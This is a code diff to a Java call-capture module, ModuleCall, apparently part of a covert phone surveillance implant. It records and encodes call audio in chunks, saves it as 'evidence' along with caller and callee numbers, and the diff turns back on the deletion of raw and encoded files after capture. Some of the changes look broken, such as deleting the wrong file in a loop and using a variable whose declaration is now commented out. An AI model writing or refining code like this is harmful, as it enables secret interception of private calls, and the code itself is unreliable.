@@ -14,6 +14,8 @@ import java.io.File;
 import java.io.FilenameFilter;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Collections;
+import java.util.Comparator;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
@@ -511,8 +513,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
 			}
 
-			// TODO: zeno rimettere delete
-			//file.delete();
+			file.delete();
 
 			return true;
 		} else {
@@ -910,7 +911,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 	}
 
-	Chunk lastr = null;
+	// Chunk lastr = null;
 	boolean started = false;
 
 	// start: call start date
@@ -938,7 +939,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 				// return;
 			}
-			
+
 			String caller = callInfo.getCaller();
 			String callee = callInfo.getCallee();
 
@@ -947,9 +948,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					Check.log(TAG + " (encodeChunks) delay, just add a chunk: " + chunks.size());
 				}
 				chunks.add(new Chunk(encodedFile, begin, end, remote));
+				sort_chunks();
 			} else {
 				// Encode to evidence
-				// TODO add caller/callee phone number and right timestamps
 				int channel = remote ? 1 : 0;
 
 				if (!started) {
@@ -957,23 +958,28 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (encodeChunks): saving, possibly discarted, remote: " + begin);
 						}
-						lastr = new Chunk(encodedFile, begin, end, remote);
+						chunks.add(new Chunk(encodedFile, begin, end, remote));
+						sort_chunks();
 					} else {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (encodeChunks): first LOCAL: " + encodedFile);
 						}
-						
 						started = true;
-						
+
 						Chunk firstl = new Chunk(encodedFile, begin, end, remote);
-						
-						if (firstl.begin.getTime() < lastr.begin.getTime()) {
-							saveCallEvidence(caller, callee, firstl, callInfo.programId);
-							saveCallEvidence(caller, callee, lastr, callInfo.programId);
-						} else {
-							saveCallEvidence(caller, callee, lastr, callInfo.programId);
-							saveCallEvidence(caller, callee, firstl, callInfo.programId);							
+						chunks.add(firstl);
+						sort_chunks();
+
+						for (Chunk chunk : chunks) {
+							if (chunk.end.getTime() < firstl.begin.getTime()) {
+								AutoFile file = new AutoFile(encodedFile);
+								file.delete();
+							} else {
+								saveCallEvidence(caller, callee, chunk, callInfo.programId);
+							}
 						}
+						chunks.clear();
+
 					}
 				} else {
 					saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, channel, callInfo.programId);
@@ -994,7 +1000,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				chunks = new ArrayList<Chunk>();
 
 				started = false;
-				lastr = null;
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(encodeChunks): end of call reached");
@@ -1007,14 +1012,21 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + "(encodeChunks): deleting " + f);
 		}
 
-		// TODO zeno rimettere delete
-		//audioEncoder.removeRawFile();
+		audioEncoder.removeRawFile();
 
 	}
 
+	private void sort_chunks() {
+		Collections.sort(chunks, new Comparator<Chunk>() {
+			public int compare(Chunk ch1, Chunk ch2) {
+				return (int) (ch1.begin.getTime() - ch2.begin.getTime());
+			}
+		});
+	}
+
 	private void saveCallEvidence(String caller, String callee, Chunk chunk, int programId) {
-		saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false,
-				chunk.channel, programId);
+		saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
+				programId);
 	}
 
 	private void saveAllEvidences(List<Chunk> chunks, Date begin, Date end) {
@@ -1038,7 +1050,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				} else {
 					started = true;
 				}
-				
+
 				saveCallEvidence(caller, callee, true, lastr.begin, lastr.end, lastr.encodedFile, false, lastr.channel,
 						callInfo.programId);
 				saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
